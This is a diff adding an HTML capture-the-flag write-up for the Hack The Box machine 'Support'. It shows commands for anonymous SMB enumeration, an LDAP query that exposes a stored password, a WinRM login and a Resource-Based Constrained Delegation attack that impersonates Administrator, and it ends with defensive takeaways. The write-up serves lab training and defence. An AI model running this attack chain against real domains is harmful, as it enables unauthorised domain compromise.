@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Support — HTB Writeup (Lanky)</title>
+  <meta name="description" content="Hack The Box: Support — Easy Windows DC. Anonymous SMB → decompiled binary → LDAP → RBCD → SYSTEM.">
+  <link rel="stylesheet" href="../assets/style.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#127875;</text></svg>">
+</head>
+<body>
+  <header class="nav">
+    <div class="wrap">
+      <a class="brand" href="../index.html">lanky<span class="accent">.pwns</span></a>
+      <a class="link" href="../index.html#writeups">← all writeups</a>
+    </div>
+  </header>
+
+  <article class="wrap">
+    <a class="back" href="../index.html#writeups">back to writeups</a>
+    <h1 style="margin-top:16px;">Support</h1>
+    <div class="subtitle">Hack The Box · <a href="https://app.hackthebox.com/machines/Support" target="_blank" rel="noopener">app.hackthebox.com/machines/Support</a> · retired</div>
+    <div class="machine-meta">
+      <span class="pill" style="color:var(--cyan);border-color:rgba(46,230,214,0.35)">Windows</span>
+      <span class="pill diff-easy">Easy</span>
+      <span class="pill">Active Directory</span>
+      <span class="pill rooted">● rooted</span>
+    </div>
+
+    <div class="callout">
+      <span class="tag">TL;DR</span>
+      A chain of small misconfigurations ending in full domain compromise: an anonymous SMB share leaked a
+      .NET tool → decompiling it recovered an "obfuscated" LDAP bind password → LDAP exposed a user password in
+      cleartext → WinRM foothold → <code>GenericAll</code> over the DC enabled a Resource-Based Constrained
+      Delegation (RBCD) attack → <strong>SYSTEM</strong>. No CVE, no exploit — every step was a bad practice.
+    </div>
+
+    <h2><span class="num">01</span>Recon</h2>
+    <pre data-lang="bash"><code>nmap -sC -sV -oN nmap/support 10.10.11.174
+# 53 DNS, 88 Kerberos, 139/445 SMB, 389/636 LDAP, 5985 WinRM — classic Windows DC</code></pre>
+
+    <h2><span class="num">02</span>Foothold</h2>
+    <h3>Anonymous SMB share</h3>
+    <p>An SMB share allowed anonymous listing and exposed a .NET binary, <code>UserInfo.exe</code>:</p>
+    <pre data-lang="bash"><code>smbclient -N -L //10.10.11.174/          # enumerate shares anonymously
+smbclient -N //10.10.11.174/support-tools
+# get UserInfo.exe</code></pre>
+
+    <h3>Decompile → recover the LDAP bind password</h3>
+    <p>
+      Decompiling the binary (dnSpy / ILSpy) revealed a hardcoded LDAP bind credential that was "protected"
+      with a <strong>hardcoded XOR key + base64</strong> — obfuscation, not encryption. Reversing the routine
+      recovered the plaintext bind password in seconds.
+    </p>
+
+    <h3>LDAP leaks a cleartext user password</h3>
+    <p>Using the recovered bind account to query LDAP, a user's password sat in the <code>info</code> attribute in cleartext:</p>
+    <pre data-lang="bash"><code>ldapsearch -x -H ldap://10.10.11.174 -D 'support\ldap' -w '&lt;recovered-pw&gt;' \
+  -b 'DC=support,DC=htb' '(objectClass=user)' info</code></pre>
+
+    <div class="flag"><span class="label">user.txt</span>&lt;redacted&gt;</div>
+    <pre data-lang="bash"><code>evil-winrm -i 10.10.11.174 -u support -p '&lt;ldap-info-pw&gt;'   # WinRM foothold</code></pre>
+
+    <h2><span class="num">03</span>Privilege Escalation — RBCD</h2>
+    <p>
+      BloodHound showed the foothold user's group held <code>GenericAll</code> over the Domain Controller
+      computer object. That's enough to stage a <strong>Resource-Based Constrained Delegation</strong> attack:
+      create a computer account, set it as an allowed delegate on the DC, then request a service ticket
+      impersonating a Domain Admin.
+    </p>
+    <pre data-lang="bash"><code># add a controlled computer account (MachineAccountQuota default = 10)
+# set RBCD on the DC, then impersonate Administrator via S4U
+rbcd.py -delegate-to 'DC$' -from 'FAKE01$' -action write support.htb/support
+getST.py -spn 'cifs/dc.support.htb' -impersonate Administrator support.htb/FAKE01$
+# use the ticket -> DA
+</code></pre>
+    <div class="flag"><span class="label">root.txt</span>&lt;redacted&gt;</div>
+
+    <h2><span class="num">04</span>Defensive takeaways</h2>
+    <ul>
+      <li><strong>Kill anonymous SMB access</strong> — it leaked the initial binary.</li>
+      <li><strong>Obfuscation ≠ encryption</strong> — never hardcode secrets in binaries; XOR+base64 is trivially reversed.</li>
+      <li><strong>Don't store passwords in directory attributes</strong> (<code>info</code>, <code>description</code>).</li>
+      <li><strong>Audit DACLs on Tier 0 assets</strong> — <code>GenericAll</code> on a DC is game over.</li>
+      <li><strong>Set <code>MachineAccountQuota</code> to 0</strong> to break RBCD at the source.</li>
+      <li>Defence in depth: the attacker must win every step — the defender only has to win one.</li>
+    </ul>
+
+    <p style="margin-top:40px;"><a class="back" href="../index.html#writeups">back to writeups</a></p>
+  </article>
+
+  <footer><div class="wrap">Support · rooted · Lanky &nbsp;·&nbsp; <a href="../index.html#writeups">all writeups</a></div></footer>
+</body>
+</html>
